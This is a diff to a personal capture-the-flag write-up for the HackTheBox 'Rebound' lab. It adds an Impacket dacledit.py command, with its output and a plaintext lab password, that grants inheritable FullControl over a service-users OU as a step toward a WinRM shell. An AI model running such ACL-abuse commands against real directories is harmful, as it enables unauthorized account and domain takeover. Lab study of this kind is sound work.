@@ -282,3 +282,15 @@ Now i have `GenericAll` over the OU
 ![[Pasted image 20260404153153.png]]
 This means i should be able to compromise `winrm_svc` and since they are apart of `remote management users` i should be able to get shell access as that user
 
+# Giving GenericAll to all child objects in the OU
+```python
+faketime -f +7h dacledit.py -k -no-pass -action 'write' -rights 'FullControl' -inheritance -principal 'oorend' -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'rebound.htb'/'oorend':'1GR8t@$$4u' -use-ldaps
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+[*] DACL backed up to dacledit-20260404-230648.bak
+[*] DACL modified successfully!
+```
+Thoid
+
